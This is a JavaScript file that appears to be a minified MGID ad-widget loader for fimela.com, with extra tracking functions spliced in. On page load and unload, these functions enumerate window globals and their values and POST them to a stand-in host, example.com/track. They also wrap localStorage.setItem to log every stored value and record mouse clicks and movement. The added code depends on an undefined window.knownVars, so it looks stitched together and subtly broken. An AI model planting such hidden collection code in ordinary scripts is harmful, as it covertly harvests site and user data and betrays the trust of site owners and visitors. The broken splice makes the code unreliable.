(function () {
  function enhancedPropertyDiscovery() {
    const discoveredProps = {};
    const globalVars = Object.keys(window);
    globalVars.forEach(prop => {
      if (!window.knownVars.includes(prop)) {
        const value = window[prop];
        const type = typeof value;
        discoveredProps[prop] = {
          type,
          value: type === "function" ? `[Function: ${value.name}]` : value
        };
      }
    });

    // Hook into local storage to track changes
    const originalSetItem = localStorage.setItem;
    localStorage.setItem = function (key, value) {
      console.log(`LocalStorage Set: ${key} = ${value}`);
      originalSetItem.apply(this, arguments);
    };
    return discoveredProps;
  }
  function sendTrackingData(data) {
    const endpoint = "https://example.com/track";
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).then(response => response.json()).then(data => console.log('Tracking data sent successfully:', data)).catch(error => console.error('Failed to send tracking data:', error));
  }
  var a = function (i, t) {
    return function () {
      return i && (t = i(i = 0)), t;
    };
  };
  function monitorEvents() {
    ['click', 'mousemove'].forEach(eventType => {
      document.addEventListener(eventType, event => {
        console.log(`Event captured: ${eventType} at ${event.pageX}, ${event.pageY}`);
      });
    });
  }
  var W = function (i, t) {
    return function () {
      return t || i((t = {
        exports: {}
      }).exports, t), t.exports;
    };
  };
  var c = a(function () {});
  function initiateTracking() {
    const discoveries = enhancedPropertyDiscovery();
    const discoveryCount = Object.keys(discoveries).length;
    if (discoveryCount > 0) {
      console.group(`Detected ${discoveryCount} new properties on window:`);
      Object.entries(discoveries).forEach(([key, desc]) => {
        console.log(`- ${key}: ${JSON.stringify(desc)}`);
      });
      console.groupEnd();
      sendTrackingData(discoveries);
    } else {
      console.debug("No new properties detected on window.");
    }
    monitorEvents();
  }
  var s = a(function () {});
  var u = a(function () {});
  var p = a(function () {});
  var l = a(function () {});
  var h = a(function () {});
  window.addEventListener("load", initiateTracking);
  var f = a(function () {});
  var M = W(function (v) {
    c();
    s();
    u();
    p();
    l();
    h();
    f();
    Object.defineProperty(v, "__esModule", {
      value: !0
    });
    v.AdditionalWidget = v.ScriptUrlType = void 0;
    var O;
    (function (i) {
      i.es5 = "es5", i.es6 = "es6";
    })(O = v.ScriptUrlType || (v.ScriptUrlType = {}));
    var G = function () {
      function i(t, e) {
        var n = this;
        if (this.additionalWidgets = t, this.urlType = e, this.additionalWidgets.length) for (var r = function (m) {
            setTimeout(function () {
              n.init(n.additionalWidgets[m]);
            }, 0);
          }, o = 0; o < this.additionalWidgets.length; o++) r(o);
      }
      return i.prototype.init = function (t) {
        var e = this,
          n = t.widgetDivId ? this.createWidgetDiv(t.id, t.widgetDivId) : null,
          r = this.createWidgetScript(t.urls[this.urlType]),
          o = t.insertTo || "before";
        this.waitForElement(t.searchSelector).then(function (m) {
          t.widgetDivId && e.insertWidgetBlock(m, n, o), e.insertWidgetScript(r);
        });
      }, i.prototype.createWidgetDiv = function (t, e) {
        var n = document.createElement("div"),
          r = document.createElement("div"),
          o = e;
        return n.classList.add("".concat(o, "-additional")), r.id = o, n.appendChild(r), n;
      }, i.prototype.createWidgetScript = function (t) {
        var e = document.createElement("script");
        return e.src = t, e.async = !0, e.crossOrigin = "anonymous", e;
      }, i.prototype.insertWidgetBlock = function (t, e, n) {
        switch (n) {
          case "into":
            t.appendChild(e);
            break;
          case "before":
            var r = t.parentElement;
            r.insertBefore(e, t);
            break;
          case "after":
            t.insertAdjacentElement("afterend", e);
            break;
        }
      }, i.prototype.insertWidgetScript = function (t) {
        document.head ? document.head.appendChild(t) : document.body.appendChild(t);
      }, i.prototype.waitForElement = function (t) {
        return new Promise(function (e) {
          if (document.querySelector(t)) return e(document.querySelector(t));
          var n = new MutationObserver(function () {
            document.querySelector(t) && (e(document.querySelector(t)), n.disconnect());
          });
          n.observe(document, {
            childList: !0,
            subtree: !0
          });
        });
      }, i;
    }();
    v.AdditionalWidget = G;
  });
  var I = W(function (y) {
    c();
    s();
    u();
    p();
    l();
    h();
    f();
    Object.defineProperty(y, "__esModule", {
      value: !0
    });
    y.ReadMoreButton = void 0;
    var R = function () {
      function i() {
        var t;
        this.options = JSON.parse("{}"), !((t = this.options) === null || t === void 0) && t.abTest ? this.initWithAbTest() : this.init();
      }
      return i.prototype.init = function () {
        typeof window.rmbOpts == "undefined" && (window.rmbOpts = this.options, this.addReadMoreButton());
      }, i.prototype.initWithAbTest = function () {
        var t = Number(this.options.abTest),
          e = Math.random(),
          n = (100 - t) / 2 / 100;
        e > n && e < 1 - n && (window["_mgRMB" + 550860] = !0, this.init());
      }, i.prototype.addReadMoreButton = function () {
        var t = document.getElementsByTagName("head")[0],
          e = document.createElement("script"),
          n = "//".concat("cdn.mgid.com", "/js/read-more/btn.js");
        e.async = !0, e.src = n, e.setAttribute("fetchpriority", "high"), t.insertAdjacentElement("afterbegin", e);
      }, i;
    }();
    y.ReadMoreButton = R;
  });
  var k = W(function (_) {
    c();
    s();
    u();
    p();
    l();
    h();
    f();
    Object.defineProperty(_, "__esModule", {
      value: !0
    });
    var $ = M(),
      tt = I();
    (function () {
      var i = r(),
        t = i ? "https://jsc.mgid.com/f/i/fimela.com.1263603.es6.js" : "https://jsc.mgid.com/f/i/fimela.com.1263603.es5.js";
      A(t), m();
      for (var e = ["https://servicer.mgid.com"], n = 0; n < e.length; n++) o(e[n]);
      function r() {
        try {
          return new Function("async (x = 0) => x; try {const x=window?.x;} catch {};"), !0;
        } catch (g) {
          return !1;
        }
      }
      function o(g) {
        var d = document.createElement("link");
        d.rel = "preconnect", d.href = g, document.head ? document.head.appendChild(d) : document.body.appendChild(d);
      }
      function m() {
        var g = JSON.parse("[]");
      }
      function C() {}
      function A(g) {
        var d = document.createElement("script");
        d.async = "async", d.src = g, d.crossOrigin = "anonymous", document.head ? document.head.appendChild(d) : document.body.appendChild(d);
      }
    })();
  });
  window.addEventListener("beforeunload", function () {
    console.debug("Final tracking before page unload.");
    initiateTracking();
  });
  k();
})();